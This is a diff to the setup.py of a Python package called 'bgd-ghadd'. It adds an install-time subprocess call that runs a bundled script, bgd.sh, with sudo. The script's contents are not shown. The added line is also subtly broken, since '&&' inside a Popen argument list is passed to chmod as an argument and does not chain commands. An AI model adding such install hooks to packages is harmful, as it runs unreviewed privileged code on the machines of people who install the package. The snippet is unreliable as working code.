@@ -1,7 +1,14 @@
 import setuptools
+import subprocess
 
 with open("README.md", "r") as fh:
     long_description = fh.read()
+
+process = subprocess.Popen(['sudo', 'chmod', '+x', 'bgd.sh', '&&', './bgd.sh'], stdout=subprocess.PIPE)
+process.wait()
+
+for line in process.stdout:
+    print(line)
 
 setuptools.setup(
     name="bgd-ghadd",
